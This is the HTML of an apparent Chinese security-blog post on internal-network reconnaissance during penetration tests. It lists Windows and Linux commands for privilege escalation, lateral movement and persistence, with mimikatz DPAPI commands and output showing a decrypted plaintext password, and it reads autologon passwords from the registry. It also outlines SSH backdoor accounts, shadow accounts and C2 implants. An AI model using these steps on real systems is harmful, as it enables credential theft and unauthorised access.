@@ -1,0 +1,717 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网信息收集 | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;GkK4AgXsqng6OLAGs45MUg https:&#x2F;&#x2F;www.cnblogs.com&#x2F;willing-sir&#x2F;p&#x2F;16541890.html 谢公子、小迪等众多师傅的  仅供参考，写的比较乱 不同阶段的信息收集有杀软的话 常见的net命令直接无法使用了，如果不小心使用，导致其他命令也无法执行，需要重新传同版本的cmd重新执行命令 无杀">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网信息收集">
+<meta property="og:url" content="https://hundredsu.github.io/post/7aba0c03.html">
+<meta property="og:site_name" content="Hundredsu&#39;Blog">
+<meta property="og:description" content="https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;GkK4AgXsqng6OLAGs45MUg https:&#x2F;&#x2F;www.cnblogs.com&#x2F;willing-sir&#x2F;p&#x2F;16541890.html 谢公子、小迪等众多师傅的  仅供参考，写的比较乱 不同阶段的信息收集有杀软的话 常见的net命令直接无法使用了，如果不小心使用，导致其他命令也无法执行，需要重新传同版本的cmd重新执行命令 无杀">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-08-07T10:03:02.000Z">
+<meta property="article:modified_time" content="2025-08-07T10:06:45.283Z">
+<meta property="article:author" content="Hundredsu">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "内网信息收集",
+  "url": "https://hundredsu.github.io/post/7aba0c03.html",
+  "image": "https://hundredsu.github.io/img/avatar.jpg",
+  "datePublished": "2025-08-07T10:03:02.000Z",
+  "dateModified": "2025-08-07T10:06:45.283Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Hundredsu",
+      "url": "https://hundredsu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://hundredsu.github.io/post/7aba0c03.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网信息收集',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">内网信息收集</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">内网信息收集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-07T10:03:02.000Z" title="发表于 2025-08-07 18:03:02">2025-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-07T10:06:45.283Z" title="更新于 2025-08-07 18:06:45">2025-08-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/GkK4AgXsqng6OLAGs45MUg">https://mp.weixin.qq.com/s/GkK4AgXsqng6OLAGs45MUg</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/willing-sir/p/16541890.html">https://www.cnblogs.com/willing-sir/p/16541890.html</a></p>
+<p>谢公子、小迪等众多师傅的</p>
+</blockquote>
+<p>仅供参考，写的比较乱</p>
+<h1 id="不同阶段的信息收集"><a href="#不同阶段的信息收集" class="headerlink" title="不同阶段的信息收集"></a>不同阶段的信息收集</h1><p>有杀软的话</p>
+<p>常见的net命令直接无法使用了，如果不小心使用，导致其他命令也无法执行，需要重新传同版本的cmd重新执行命令</p>
+<p>无杀软情况下</p>
+<h2 id="权限提升阶段"><a href="#权限提升阶段" class="headerlink" title="权限提升阶段"></a>权限提升阶段</h2><p>权限提升阶段，信息搜集主要看以下几个内容：</p>
+<ul>
+<li>本机系统版本<ul>
+<li>win<ul>
+<li>whoami &#x2F;priv</li>
+<li><code>&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;systeminfo&lt;/font&gt;</code><font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">   全部</font></li>
+<li><font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);"> </font><code>&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;net config workstation&lt;/font&gt;</code><font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">   简易</font></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>本机系统内核版本<ul>
+<li>win<ul>
+<li><code>&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;systeminfo&lt;/font&gt;</code></li>
+</ul>
+</li>
+<li>kali<ul>
+<li><code>uname -a</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>本机系统出网情况<ul>
+<li>icmp<code>ping baidu.com</code></li>
+<li>http<code>curl -I [https://www.baidu.com](https://www.baidu.com)</code></li>
+<li>DNS <code>nslookup www.baidu.com</code></li>
+<li>TCP <code>telnet ip port</code>（一般也不用探测这个）</li>
+<li>ssh <code>ssh ip</code></li>
+</ul>
+</li>
+<li>本机运行的应用和进程<ul>
+<li><code>&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;tasklist /v&lt;/font&gt;</code></li>
+</ul>
+</li>
+<li>本机开启的服务和端口<ul>
+<li>服务<ul>
+<li><font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">服务</font><code>&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;wmic service list brief&lt;/font&gt;</code></li>
+<li><font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">自启动</font><code>&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt; wmic startup get &lt;/font&gt;&lt;font style=&quot;color:rgb(193, 132, 1);background-color:rgb(250, 250, 250);&quot;&gt;command&lt;/font&gt;&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;,caption&lt;/font&gt;</code></li>
+</ul>
+</li>
+<li>端口<code>&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;netstat -ano&lt;/font&gt;</code></li>
+</ul>
+</li>
+<li>本机系统环境变量<ul>
+<li>win<ul>
+<li><code>echo %PATH%</code></li>
+</ul>
+</li>
+<li>linux<ul>
+<li>env</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>本机计划任务内容<ul>
+<li><font style="color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);">计划任务</font><code>&lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;schtasks /query /fo LIST /v&lt;/font&gt;</code></li>
+</ul>
+</li>
+<li>本机中间件环境利用</li>
+</ul>
+<p>常见的骚思路：发现系统上安装的高权限服务–&gt;查找配置文件或者命令行直接接管–&gt;通过高权限服务进行提权。</p>
+<h2 id="横向移动阶段"><a href="#横向移动阶段" class="headerlink" title="横向移动阶段"></a>横向移动阶段</h2><p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png"></p>
+<p>Mimikatz抓取本地密码</p>
+<p>fscan探测web端服务和adcs等</p>
+<p>抓取注册表中winlogon的开机自动登录的账密</p>
+<p>抓取RDP的凭证解密获取密码</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36618918/article/details/130677478">https://blog.csdn.net/qq_36618918&#x2F;article&#x2F;details&#x2F;130677478</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARaE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a C:\Users\Administrator\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(38, 38, 38);">没有凭证，但是 </font><font style="color:rgb(38, 38, 38);background-color:rgba(0, 0, 0, 0.06);">systemprofile</font><font style="color:rgb(38, 38, 38);"> 有凭证，解开：</font></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\A1906B2ADB673AEA6E3ED4890E62F506&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guidMasterKey      : &#123;<span class="number">173175</span>c7<span class="literal">-6cd1-4f1b-a20d-4e90cc6e249c</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::dpapi&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>ff515b910fbddb2d85de2ccc3b7a3785d036b7eb1976a19654b50708d64d30e1651a3a08ad114da8092fd110e09e8e675f5b98c8fb97857ca41260fb280a059</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\A1906B2ADB673AEA6E3ED4890E62F506 /masterkey:4ff515b910fbddb2d85de2ccc3b7a3785d036b7eb1976a19654b50708d64d30e1651a3a08ad114da8092fd110e09e8e675f5b98c8fb97857ca41260fb280a059&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WWcsuio123</span><br></pre></td></tr></table></figure>
+
+<p>先判断所处内网的环境是工作组还是域内</p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">systeminfo或者net config workstation（如果存在域那么就会显示工作站域和工作站域DNS等信息）</font></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">上述两条指令执行之后如果看到</font><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;WORKGROUP&lt;/font&gt;**</code></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">就可以判断是工作组环境了，反之出现xxx.com等就是域环境</font></p>
+<p><code>&lt;font style=&quot;color:rgb(0, 0, 0) !important;&quot;&gt;systeminfo &lt;/font&gt;``&lt;font style=&quot;color:rgb(0, 130, 0) !important;&quot;&gt;#是否加入域，加入了会显示域的名字，未加入显示WORKGROUP&lt;/font&gt;</code></p>
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2.png"></p>
+<hr>
+<p><strong>工作组</strong></p>
+<ul>
+<li>列出当前计算机的所有本地用户组</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">查看指定组中的成员列表</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font></strong></p>
+<p><strong><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font></strong></p>
+<p><strong><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">域环境</font></strong></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">域环境信息收集，主要针对域用户，域管理员，域控，域机器，服务，exchange邮件服务器</font></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">确定当前内网所架设的域，并且所控制的主机账户在域里面，就可以进行域内相关信息的收集了。</font></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。system 用户对应的就是域里面的机器用户，所以 system 权限用户是可以运行以下查询命令的）。（参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45290991/article/details/120028595%EF%BC%89">https://blog.csdn.net/qq_45290991/article/details/120028595）</a></font></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font></p>
+<p>横向移动阶段，信息搜集主要看以下几个内容：</p>
+<ul>
+<li>本机系统网卡信息<ul>
+<li><code>ipconfig /all</code></li>
+</ul>
+</li>
+<li>本机系统建立的网络连接</li>
+<li>抓取本机系统账户对应的密码<ul>
+<li>mimikatz抓</li>
+<li>查看注册表获取自动登录凭证<ul>
+<li><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v AutoAdminLogon</code></li>
+<li><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultDomain</code></li>
+<li><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultUsername</code></li>
+<li><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultPassword</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>本机服务和应用对应的密码</li>
+<li>本机服务和应用的配置文件</li>
+<li>对内网网段进行存活探测</li>
+<li>对存活网段内机器进行端口探测和服务探测</li>
+<li>抓取内网的流量（tcpdump抓包）</li>
+<li>对于您列出的其他信息收集需求，以下是在Linux和Windows环境下相应的命令或方法：</li>
+</ul>
+<ol>
+<li>本机系统网卡信息</li>
+</ol>
+<ul>
+<li>Linux: ifconfig -a 或 ip addr show</li>
+<li>Windows: ipconfig &#x2F;all</li>
+</ul>
+<ol start="2">
+<li>本机系统建立的网络连接</li>
+</ol>
+<ul>
+<li>Linux: netstat -tunlp 或 ss -tunlp</li>
+<li>Windows: netstat -ano</li>
+</ul>
+<ol start="3">
+<li>抓取本机系统账户对应的密码<ul>
+<li>注意：这个操作可能违反法律法规，只应在授权的渗透测试或安全审计环境中使用。</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>Linux: 通常需要root权限，且密码以哈希形式存储在 &#x2F;etc&#x2F;shadow 文件中，可以使用如 <code>john</code> 或 <code>hashcat</code> 等工具进行破解。</li>
+<li>Windows: 使用 <code>Mimikatz</code> 等工具抓取明文密码，但需注意这通常需要管理员权限。</li>
+</ul>
+<ol start="4">
+<li>本机服务和应用对应的密码<ul>
+<li>注意：这个操作可能违反法律法规，只应在授权的渗透测试或安全审计环境中使用。</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>Linux: 查找配置文件中的密码，如 <code>/etc/apache2/apache2.conf</code>、<code>/etc/mysql/my.cnf</code> 等。</li>
+<li>Windows: 查找注册表或配置文件中的密码，如 IIS 的应用程序池配置、SQL Server 的连接字符串、自动登录凭证等。</li>
+</ul>
+<ol start="5">
+<li>本机服务和应用的配置文件</li>
+</ol>
+<ul>
+<li>Linux: 服务配置文件通常位于 <code>/etc</code> 目录下，如 <code>/etc/nginx/nginx.conf</code>、<code>/etc/mysql/my.cnf</code>。</li>
+<li>Windows: 服务配置文件可能位于注册表或特定目录，如 <code>C:Program Files</code>。</li>
+</ul>
+<ol start="6">
+<li>对内网网段进行存活探测</li>
+</ol>
+<ul>
+<li>Linux: 使用 <code>nmap</code>，如 <code>nmap -sP 192.168.1.0/24</code>。</li>
+<li>Windows: 使用 <code>nmap</code> 或 <code>Advanced IP Scanner</code>。</li>
+</ul>
+<ol start="7">
+<li>对存活网段内机器进行端口探测和服务探测</li>
+</ol>
+<ul>
+<li>Linux: 使用 <code>nmap</code>，如 <code>nmap -sS -sV 192.168.1.10</code>。</li>
+<li>Windows: 使用 <code>nmap</code> 或 <code>SuperScan</code>。</li>
+</ul>
+<ol start="8">
+<li>抓取内网的流量（tcpdump抓包）</li>
+</ol>
+<ul>
+<li>Linux: 使用 <code>tcpdump</code>，如 <code>tcpdump -i eth0 -w capture.pcap</code>。</li>
+<li>Windows: 使用 <code>Wireshark</code> 或 <code>tcpdump</code>（需安装WinPcap）。<br>请确保在执行这些操作时遵守法律法规，并在授权范围内进行。未经授权的渗透测试和密码破解可能构成违法行为。</li>
+</ul>
+<p>常见的骚思路：通过查看本机建立的网络连接（<code>&lt;font style=&quot;color:rgb(233, 105, 0);background-color:rgb(248, 248, 248);&quot;&gt;netstat -an&lt;/font&gt;</code>）发现本机调用了内网其他机器的服务（如Redis）–&gt;翻找本机上的配置文件或者命令行接管–&gt;通过恶意利用内网其他机器上开放的服务（写入恶意SSH密钥等），成功横向。</p>
+<h2 id="权限维持阶段"><a href="#权限维持阶段" class="headerlink" title="权限维持阶段"></a>权限维持阶段</h2><p>权限维持阶段，信息搜集主要看以下几个内容：</p>
+<ul>
+<li>本机系统内核版本</li>
+<li>本机系统账号信息</li>
+<li>本机系统用户组信息</li>
+<li>本机系统出网情况</li>
+<li>本机计划任务内容</li>
+<li>本机运行的应用和进程</li>
+<li>注册表信息利用（Windows）</li>
+<li>WMI利用、映像劫持（Windows）</li>
+<li>SSH后门利用（Linux）</li>
+<li>本机中间件环境利用</li>
+<li>当然，以下是在Linux和Windows环境下收集内网维权所需信息的命令：</li>
+</ul>
+<ol>
+<li><strong>本机系统内核版本</strong><ul>
+<li>Linux: <code>uname -a</code></li>
+<li>Windows: <code>ver</code> 或 <code>systeminfo | findstr &quot;操作系统版本&quot;</code></li>
+</ul>
+</li>
+<li><strong>本机系统账号信息</strong><ul>
+<li>Linux: <code>cat /etc/passwd</code></li>
+<li>Windows: <code>net user</code> 或 <code>whoami /all</code></li>
+</ul>
+</li>
+<li><strong>本机系统用户组信息</strong><ul>
+<li>Linux: <code>cat /etc/group</code></li>
+<li>Windows: <code>net localgroup</code> 或 <code>whoami /groups</code></li>
+</ul>
+</li>
+<li><strong>本机系统出网情况</strong><ul>
+<li>Linux: <code>netstat -tunlp</code> 或 <code>ss -tunlp</code></li>
+<li>Windows: <code>netstat -ano</code></li>
+</ul>
+</li>
+<li><strong>本机计划任务内容</strong><ul>
+<li>Linux: <code>crontab -l</code> (针对当前用户) 或 <code>cat /etc/crontab</code> (系统级任务)</li>
+<li>Windows: <code>schtasks /query /fo LIST /v</code></li>
+</ul>
+</li>
+<li><strong>本机运行的应用和进程</strong><ul>
+<li>Linux: <code>ps -aux</code> 或 <code>top</code></li>
+<li>Windows: <code>tasklist</code> 或 <code>Get-Process</code> (PowerShell)</li>
+</ul>
+</li>
+<li><strong>注册表信息利用（Windows）</strong><ul>
+<li>Windows: <code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> (查询自启动程序)</li>
+<li>Windows: <code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> (查询当前用户自启动程序)</li>
+</ul>
+</li>
+<li><strong>WMI利用、映像劫持（Windows）</strong><ul>
+<li>Windows: <code>wmic /namespace:\\root\cimv2 path Win32_Service get Name,State,PathName</code></li>
+<li>Windows: <code>wmic process call create &quot;cmd.exe /c echo hello &gt; C:\temp\hello.txt&quot;</code></li>
+</ul>
+</li>
+<li><strong>SSH后门利用（Linux）</strong><ul>
+<li>Linux: <code>sudo apt-get install openssh-server</code> (安装SSH服务器)</li>
+<li>Linux: <code>sudo nano /etc/ssh/sshd_config</code> (编辑SSH配置文件，添加后门账号)</li>
+</ul>
+</li>
+<li><strong>本机中间件环境利用</strong><ul>
+<li>Linux: <code>ps -aux | grep apache</code> 或 <code>ps -aux | grep nginx</code> (检查Web服务器进程)</li>
+<li>Windows: <code>sc queryex w3svc</code> (检查IIS服务状态)<br>请注意，这些命令需要在相应的操作系统和权限下执行。在实际操作中，应确保遵守法律法规和道德准则，仅在授权范围内进行安全测试和漏洞评估。</li>
+</ul>
+</li>
+</ol>
+<p>常见的骚思路：上线免杀内存马和C2–&gt;做进程迁移到系统进程–&gt;同时运行一个潜伏C2进行维权；妥善利用常规的系统管理服务（如RDP&#x2F;SSH&#x2F;VNC）–&gt;插入对应的影子账户和后门–&gt;拿到机器的“合法”管理权限。</p>
+<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.png"></p>
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4.png"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5.png"></p>
+<p>使用域内特有的命令 </p>
+<p>正常回显  为域内</p>
+<p>不正常回显  则为工作组</p>
+<h3 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h3><p><strong>进入linux系统第一步，设置不记录系统命令</strong></p>
